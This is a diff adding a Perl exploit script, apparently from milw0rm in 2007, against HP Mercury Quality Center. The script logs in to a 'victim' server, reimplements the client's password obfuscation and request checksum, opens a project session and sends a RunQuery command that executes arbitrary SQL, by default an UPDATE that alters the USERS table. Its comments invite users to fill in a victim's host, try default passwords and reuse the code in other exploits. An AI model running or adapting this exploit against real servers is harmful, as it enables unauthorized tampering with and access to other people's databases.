@@ -1,0 +1,165 @@
+#!/usr/bin/perl
+#******************************************************************
+# HP Mercury Quality Center runQuery exploit.
+# Run whatever SQL you want on there db - without SQL injection.
+# Problem is client can do "RunQuery" command os we write program
+# to do this. Client can lots other things it should not also!
+# The backend database can be MSSQLServer or Oracle or nearly often
+# MSDE. This changes SQL types you can send. This is a blind SQL
+# attack but may be is it possible to get data out somehow?
+#
+# Copyright 2007 Isma Khan - Code may be freedly usuable on other
+# exploits as long as name appears.
+# ******************************************************************
+use IO::Socket;
+my $sql = "UPDATE USERS SET US_ADDRESS='0wned' WHERE US_USERNAME='paul_qc'";
+
+#my $sql = "UPDATE USERS SET US_ADDRESS='0wned' WHERE US_USERNAME='isma-khan'";
+# victim - Put yur victims hostname here.
+# vicport - Port to connect on.
+# u - username to login to quality center. This user provided.
+# p - Psswrd to login ot quality center. Try default passwords.
+# domain - A domain thhat user has access to.
+# project - A proj that user has access to.
+my $victim = '192.168.0.2'; 
+my $vicport = 8080; 
+my $u = 'alex_qc'; 
+my $p= ''; 
+my $domain = 'DEFAULT';
+my $project = 'QualityCenter_Demo';
+
+# ****** Login to HPQMC *******************
+print "Login\n";
+my @bits;
+push @bits, AddString('Login');
+push @bits, "\"0:int:1\"";
+push @bits, "\"0:int:-1\"";
+push @bits, "\"0:int:-1\"";
+push @bits, AddString("{\r\nUSER_NAME:$u,\r\nPASSWORD:" . SmolkaEncript($p) . ",\r\nCLIENTTYPE:\\00000018\\Quality Center Client UI\r\n}\r\n");
+my $tmphost="0:conststr:Bannu";
+push @bits, "\\" . MakeHex($tmphost) . "\\" . $tmphost;
+push @bits, "\"65536:str:0\"";
+push @bits, "\"0:pint:0\"";
+push @bits, "\"0:pint:0\"";
+push @bits, "\"0:pint:0\"";
+
+my $res=HTTPSending(@bits);
+undef @bits;
+my ($sesid) = $res =~ /ID:(\d+)/;
+die "Not login\n" unless($sesid);
+print "Session ID: $sesid\n";
+
+# ***** Connect to project *********
+print "Connect to project\n";
+push @bits, AddString('ConnectProject');
+push @bits, "\"0:int:2\"";
+push @bits, "\"0:int:$sesid\"";
+push @bits, "\"0:int:-1\"";
+push @bits, AddString("{\r\nDOMAIN_NAME:$domain,\r\nPROJECT_NAME:\\" . MakeHex($project) . "\\$project\r\n}\r\n");
+push @bits, "\"65536:str:0\"";
+push @bits, "\"0:pint:0\"";
+$res = HTTPSending(@bits);
+undef @bits;
+my ($psesid) = $res =~ /ID:(\d+)/;
+die "Not project\n" unless($psesid);
+print "Project Session ID: $psesid\n";
+
+# ******** Run the SQL *****
+print "Run SQL\n";
+push @bits, AddString('RunQuery');
+push @bits, "\"0:int:3\"";
+push @bits, "\"0:int:$sesid\"";
+push @bits, "\"0:int:$psesid\"";
+push @bits, AddString($sql);
+push @bits, "\"65536:str:0\"";
+push @bits, "\"0:int:0\"";
+$res = HTTPSending(@bits);
+print $res;
+
+# **** Expect to get Failed to Run Query[ERR_SEP]Messages:
+# error here but SQL like INSERT or UPDATE still work.
+
+#******************************************************************
+# Make password 
+#******************************************************************
+sub SmolkaEncript {
+	my $password=shift;
+	return '' unless($password);
+	my $cripted='ENRCRYPTED';
+	my $base = 'SmolkaWasHereMonSher';
+	my $x=0;
+	for(;$x<length($password);$x++){
+		$cripted = $cripted . (ord(substr($password,$x,1))+ord(substr($base,$x,1)));
+		$cripted = $cripted . '!';
+	}
+	return $cripted;
+}
+
+# ************************************************************
+# Send a text as HTTP to victim.
+# ***********************************************************
+sub HTTPSending {
+	my $body = bits2string(@_);
+	my $sock = IO::Socket::INET->new(proto=>'tcp',PeerAddr=>$victim,PeerPort=>$vicport)
+		or die "Can't connect. $!\n";
+	my $header =	"POST /qcbin/servlet/tdservlet/TDAPI_GeneralWebTreatment HTTP/1.0\r\n"
+.	"Content-Type: text/html; charset=UTF-8\r\n"
+.	"X-TD-ID: " . sprintf("%08X",XTDID($body)). "\r\n"
+. 	"User-Agent: TeamSoft WinInet Component\r\n"
+.	"Content-Length: " . length($body) . "\r\n"
+.	"Pragma: no-cache\r\n"
+.	"\r\n";
+	print $sock $header;
+	print $sock $body;
+	my $text;
+	while(!eof($sock)){
+		$text .= <$sock>;
+	}
+	return $text;
+}
+
+# ********* HPMQCs conststr type *********
+sub AddString {
+	my $str = shift;
+	if (length($str)<16){
+		return "\"0:conststr:$str\"";
+	} else {
+		return '\\' . MakeHex("0:conststr:$str") . "\\0:conststr:$str";
+	}
+
+}
+# ********HPMQC uses hex digits in many place ************
+sub MakeHex {
+	return sprintf("%08x",length(shift));
+}
+
+# ********************************************************
+# This takes @bits and make big longer string out of it.
+# *******************************************************
+sub bits2string {
+	my @bits=@_;
+	my $bitno = 0;
+	my $retstr="{\r\n";
+	foreach my $onebit (@bits){
+		$retstr .= $bitno++ . ": $onebit,\r\n";
+	}
+	$retstr = substr($retstr,0,-3);
+	$retstr = $retstr . "\r\n}\r\n";
+	return $retstr;
+}
+
+# *************************************************
+# HPMQC useid X-TD-ID header which is sum of all chars
+# in body plus number 2301. Could checksum?
+# **********************************************
+sub XTDID {
+	my $total=2301;
+	my $body = shift;
+
+	for(my $i=0;$i<length($body);$i++){
+		$total += ord(substr($body,$i,1));
+	}
+	return $total;
+}
+
+# milw0rm.com [2007-04-03]
